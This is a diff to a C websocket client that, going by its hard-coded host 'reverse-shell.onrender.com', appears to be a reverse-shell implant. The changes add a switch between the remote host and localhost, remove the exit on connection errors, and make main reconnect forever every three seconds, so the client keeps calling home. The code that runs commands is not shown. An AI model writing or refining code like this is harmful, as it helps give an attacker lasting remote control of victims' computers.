@@ -8,6 +8,8 @@
 #include "auth.h"
 #include "tools.h"
 
+// #define _DEV
+
 char *msg = NULL;
 size_t msg_size = 0;
 
@@ -165,13 +167,11 @@ static int callback_echo(struct lws *wsi, enum lws_callback_reasons reason,
 
         case LWS_CALLBACK_CLIENT_CONNECTION_ERROR:
             printf("Connection error\n");
-            exit(1);
             interrupted = 1;
             break;
 
         case LWS_CALLBACK_CLIENT_CLOSED:
             printf("Disconnected from server\n");
-            exit(1);
             interrupted = 1;
             break;
 
@@ -185,10 +185,13 @@ int establish_connection(){
     struct lws_context_creation_info info;
     struct lws_client_connect_info ccinfo;
     struct lws_context *context;
-    const char *url = "reverse-shell.onrender.com";
-    int port = 443;
-    // const char *url = "localhost";
-    // int port = 8080;
+    #ifndef _DEV
+        const char *url = "reverse-shell.onrender.com";
+        int port = 443;
+    #else
+        const char *url = "localhost";
+        int port = 8080;
+    #endif
 
     memset(&info, 0, sizeof info);
     info.port = CONTEXT_PORT_NO_LISTEN;
@@ -212,7 +215,9 @@ int establish_connection(){
     ccinfo.host = url;
     ccinfo.origin = url;
     ccinfo.protocol = "chat";
-    ccinfo.ssl_connection = LCCSCF_USE_SSL; // Enable SSL/TLS
+    #ifndef _DEV
+        ccinfo.ssl_connection = LCCSCF_USE_SSL; // Enable SSL/TLS
+    #endif
     ccinfo.pwsi = NULL;
 
     signal(SIGINT, sigint_handler);
@@ -225,14 +230,23 @@ int establish_connection(){
 
     while (!interrupted) {
         lws_service(context, 1000);
-        Sleep(1);
+        Sleep(1); // Sleep for 1ms to reduce CPU usage (significantly)
+        /* ! TODO: reconnect logic ! */
     }
 
+    // Clean up
     lws_context_destroy(context);
+    return 0;
 }
 
 int main() {
-    establish_connection();
+    while(1){
+        establish_connection();
+        sentId = 0;
+        interrupted = 0;
+        printf("Reconnecting in 3 seconds...\n");
+        Sleep(3000);
+    }
     
     return 0;
 }
